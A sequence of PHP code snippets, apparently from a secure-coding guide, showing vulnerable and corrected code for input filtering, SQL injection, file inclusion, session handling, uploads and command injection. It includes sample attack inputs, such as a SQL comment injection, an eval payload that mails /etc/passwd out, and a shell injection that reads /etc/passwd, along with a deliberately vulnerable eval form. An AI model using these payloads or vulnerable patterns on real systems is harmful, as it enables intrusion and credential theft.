["```php\n<form action=\"process.php\" method=\"POST\">\n <p>Please select a color:\n\n <select name=\"color\">\n <option value=\"red\">red</option>\n <option value=\"green\">green</option>\n <option value=\"blue\">blue</option>\n </select>\n\n <input type=\"submit\" /></p>\n</form>\n```", "```php\n$clean = array();\n\nswitch($_POST['color']) {\n case 'red':\n case 'green':\n case 'blue':\n $clean['color'] = $_POST['color'];\n break;\n\n default:\n /* ERROR */\n break;\n}\n```", "```php\n$clean = array();\n\nif (ctype_alnum($_POST['username'])) {\n $clean['username'] = $_POST['username'];\n}\nelse {\n /* ERROR */\n}\n```", "```php\n$clean = array();\n\n$length = mb_strlen($_POST['username']);\n\nif (ctype_alnum($_POST['username']) && ($length > 0) && ($length <= 32)) {\n $clean['username'] = $_POST['username'];\n}\nelse {\n /* ERROR */\n}\n```", "```php\n$clean = array();\n\nif (preg_match(\"/[^A-Za-z \\'\\-]/\", $_POST['last_name'])) {\n /* ERROR */\n}\nelse {\n $clean['last_name'] = $_POST['last_name'];\n}\n```", "```php\n$html = array();\n$html['username'] = htmlentities($clean['username'], ENT_QUOTES, 'UTF-8');\n\necho \"<p>Welcome back, {$html['username']}.</p>\";\n```", "```php\n<a href=\"http://host/script.php?var={$value}\">Click Here</a>\n```", "```php\n$url = array(\n 'value' => urlencode($value),\n);\n\n$link = \"http://host/script.php?var={$url['value']}\";\n\n$html = array(\n 'link' => htmlentities($link, ENT_QUOTES, \"UTF-8\"),\n);\n\necho \"<a href=\\\"{$html['link']}\\\">Click Here</a>\";\n```", "```php\n$mysql = array(\n 'username' => mysqli_real_escape_string($clean['username']),\n);\n\n$sql = \"SELECT * FROM profile\n WHERE username = '{$mysql['username']}'\";\n\n$result = mysql_query($sql);\n```", "```php\n$sql = \"INSERT INTO users (last_name) VALUES (?)\";\n\n$db->query($sql, array($clean['last_name']));\n```", "```php\nclass Encoder\n{\n const ENCODE_STYLE_HTML = 0;\n const ENCODE_STYLE_JAVASCRIPT = 1;\n const ENCODE_STYLE_CSS = 2;\n const ENCODE_STYLE_URL = 3;\n const ENCODE_STYLE_URL_SPECIAL = 4;\n\n private static $URL_UNRESERVED_CHARS =\n 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcedfghijklmnopqrstuvwxyz-_.~';\n\n public function encodeForHTML($value) {\n $value = str_replace('&', '&amp;', $value);\n $value = str_replace('<', '&lt;', $value);\n $value = str_replace('>', '&gt;', $value);\n $value = str_replace('\"', '&quot;', $value);\n $value = str_replace('\\'', '&#x27;', $value); // &apos; is not recommended\n $value = str_replace('/', '&#x2F;', $value); // forward slash can help end \n HTML entity\n\n return $value;\n }\n\n public function encodeForHTMLAttribute($value) {\n return $this->_encodeString($value);\n }\n\n public function encodeForJavascript($value) {\n return $this->_encodeString($value, self::ENCODE_STYLE_JAVASCRIPT);\n }\n\n public function encodeForURL($value) {\n return $this->_encodeString($value, self::ENCODE_STYLE_URL_SPECIAL);\n }\n\n public function encodeForCSS($value) {\n return $this->_encodeString($value, self::ENCODE_STYLE_CSS);\n }\n\n /**\n * Encodes any special characters in the path portion of the URL. Does not\n * modify the forward slash used to denote directories. If your directory\n * names contain slashes (rare), use the plain urlencode on each directory\n * component and then join them together with a forward slash.\n *\n * Based on http://en.wikipedia.org/wiki/Percent-encoding and\n * http://tools.ietf.org/html/rfc3986\n */\n public function encodeURLPath($value) {\n $length = mb_strlen($value);\n\n if ($length == 0) {\n return $value;\n }\n\n $output = '';\n\n for ($i = 0; $i < $length; $i++) {\n $char = mb_substr($value, $i, 1);\n\n if ($char == '/') {\n // Slashes are allowed in paths.\n $output .= $char;\n }\n else if (mb_strpos(self::$URL_UNRESERVED_CHARS, $char) == false) {\n // It's not in the unreserved list so it needs to be encoded.\n $output .= $this->_encodeCharacter($char, self::ENCODE_STYLE_URL);\n }\n else {\n // It's in the unreserved list so let it through.\n $output .= $char;\n }\n }\n\n return $output;\n }\n\n private function _encodeString($value, $style = self::ENCODE_STYLE_HTML) {\n if (mb_strlen($value) == 0) {\n return $value;\n }\n\n $characters = preg_split('/(?<!^)(?!$)/u', $value);\n $output = '';\n\n foreach ($characters as $c) {\n $output .= $this->_encodeCharacter($c, $style);\n }\n\n return $output;\n }\n\n private function _encodeCharacter($c, $style = self::ENCODE_STYLE_HTML) {\n if (ctype_alnum($c)) {\n return $c;\n }\n\n if (($style === self::ENCODE_STYLE_URL_SPECIAL) && ($c == '/' || $c == ':')) {\n return $c;\n }\n\n $charCode = $this->_unicodeOrdinal($c);\n\n $prefixes = array(\n self::ENCODE_STYLE_HTML => array('&#x', '&#x'),\n self::ENCODE_STYLE_JAVASCRIPT => array('\\\\x', '\\\\u'),\n self::ENCODE_STYLE_CSS => array('\\\\', '\\\\'),\n self::ENCODE_STYLE_URL => array('%', '%'),\n self::ENCODE_STYLE_URL_SPECIAL => array('%', '%'),\n );\n\n $suffixes = array(\n self::ENCODE_STYLE_HTML => ';',\n self::ENCODE_STYLE_JAVASCRIPT => '',\n self::ENCODE_STYLE_CSS => '',\n self::ENCODE_STYLE_URL => '',\n self::ENCODE_STYLE_URL_SPECIAL => '',\n );\n\n // if ASCII, encode with \\\\xHH\n if ($charCode < 256) {\n $prefix = $prefixes[$style][0];\n $suffix = $suffixes[$style];\n\n return $prefix . str_pad(strtoupper(dechex($charCode)), 2, '0') . $suffix;\n }\n\n // otherwise encode with \\\\uHHHH\n $prefix = $prefixes[$style][1];\n $suffix = $suffixes[$style];\n\n return $prefix . str_pad(strtoupper(dechex($charCode)), 4, '0') . $suffix;\n }\n\n private function _unicodeOrdinal($u) {\n $c = mb_convert_encoding($u, 'UCS-2LE', 'UTF-8');\n $c1 = ord(substr($c, 0, 1));\n $c2 = ord(substr($c, 1, 1));\n\n return $c2 * 256 + $c1;\n }\n}\n```", "```php\necho $_POST['username'];\n```", "```php\n$html = array(\n 'username' => htmlentities($_POST['username'], ENT_QUOTES, \"UTF-8\"),\n);\n\necho $html['username'];\n```", "```php\n$hash = hash($_POST['password']);\n\n$sql = \"SELECT count(*) FROM users\n WHERE username = '{$_POST['username']}' AND password = '{$hash}'\";\n\n$result = mysql_query($sql);\n```", "```php\nchris' --\n```", "```php\nSELECT count(*)\nFROM users\nWHERE username = 'chris' --'\nAND password = '...'\";\n```", "```php\nSELECT count(*)\nFROM users\nWHERE username = 'chris'\n```", "```php\n$mysql = array();\n\n$hash = hash($_POST['password']);\n$mysql['username'] = mysql_real_escape_string($clean['username']);\n\n$sql = \"SELECT count(*) FROM users\n WHERE username = '{$mysql['username']}' AND password = '{$hash}'\";\n\n$result = mysql_query($sql);\n```", "```php\n$sql = $db->prepare(\"SELECT count(*) FROM users\n WHERE username = :username AND password = :hash\");\n\n$sql->bindParam(\":username\", $clean['username'], PDO::PARAM_STRING, 32);\n$sql->bindParam(\":hash\", hash($_POST['password']), PDO::PARAM_STRING, 32);\n```", "```php\ninclude(\"/usr/local/lib/greetings/{$username}\");\n```", "```php\nchdir(\"/usr/local/lib/greetings\");\n$fp = fopen($username, 'r');\n```", "```php\n$file = $_REQUEST['theme'];\ninclude($file);\n```", "```php\n$filename = $_POST['username'];\n$vetted = basename(realpath($filename));\n\nif ($filename !== $vetted) {\n die(\"{$filename} is not a good username\");\n}\n```", "```php\ninclude(\"/usr/local/lib/greetings/{$filename}\");\n```", "```php\n<a href=\"http://host/login.php?PHPSESSID=1234\">Log In</a>\n```", "```php\nif (check_auth($_POST['username'], $_POST['password'])) {\n $_SESSION['auth'] = TRUE;\n session_regenerate_id(TRUE);\n}\n```", "```php\n$browserName = $_FILES['image']['name'];\n$tempName = $_FILES['image']['tmp_name'];\n\necho \"Thanks for sending me {$browserName}.\";\n\n$counter++; // persistent variable\n$filename = \"image_{$counter}\";\n\nif (is_uploaded_file($tempName)) {\n move_uploaded_file($tempName, \"/web/images/{$filename}\");\n}\nelse {\n die(\"There was a problem processing the file.\");\n}\n```", "```php\npost_max_size = 1024768; // one megabyte\n```", "```php\n$uploadFilepath = $_FILES['uploaded']['tmp_name'];\n\nif (is_uploaded_file($uploadFilepath)) {\n $fp = fopen($uploadFilepath, 'r');\n\n if ($fp) {\n $text = fread($fp, filesize($uploadFilepath));\n fclose($fp);\n\n // do something with the file's contents\n }\n}\n```", "```php\nmove_uploaded_file($_REQUEST['file'], \"/new/name.txt\");\n```", "```php\nopen_basedir = /some/path\n```", "```php\nunlink(\"/some/path/unwanted.exe\");\ninclude(\"/some/path/less/travelled.inc\");\n```", "```php\n$fp = fopen(\"/some/other/file.exe\", 'r');\n$dp = opendir(\"/some/path/../other/file.exe\");\n```", "```php\n<VirtualHost 1.2.3.4>\n ServerName domainA.com\n DocumentRoot /web/sites/domainA\n php_admin_value open_basedir /web/sites/domainA\n</VirtualHost>\n```", "```php\n# by directory\n<Directory /home/httpd/html/app1>\n php_admin_value open_basedir /home/httpd/html/app1\n</Directory>\n\n# by URL\n<Location /app2>\n php_admin_value open_basedir /home/httpd/html/app2\n</Location>\n```", "```php\numask(077); // disable ---rwxrwx\n$fh = fopen(\"/tmp/myfile\", 'w');\n```", "```php\nphp_value session.save_path /some/path\n```", "```php\n<Files ~ \"\\.inc$\">\n Order allow,deny\n Deny from all\n</Files>\n```", "```php\ninclude_path = \".:/usr/local/php:/usr/local/lib/myapp\";\n```", "```php\n<html>\n <head>\n <title>Here are the keys...</title>\n </head>\n\n <body>\n <?php if ($_REQUEST['code']) {\n echo \"Executing code...\";\n\n eval(stripslashes($_REQUEST['code'])); // BAD!\n } ?>\n\n <form action=\"<?php echo $_SERVER['PHP_SELF']; ?>\">\n <input type=\"text\" name=\"code\" />\n <input type=\"submit\" name=\"Execute Code\" />\n </form>\n </body>\n</html>\n```", "```php\ninclude(\"/etc/passwd\");\n```", "```php\ndisable_functions = system\n```", "```php\neval(\"2 + {$userInput}\");\n```", "```php\n2; mail(\"l33t@somewhere.com\", \"Some passwords\", \"/bin/cat /etc/passwd\");\n```", "```php\nsystem(\"ls {$directory}\");\n```", "```php\nls /tmp;cat /etc/passwd\n```", "```php\n$cleanedArg = escapeshellarg($directory);\nsystem(\"ls {$cleanedArg}\");\n```", "```php\nls '/tmp;cat /etc/passwd'\n```"]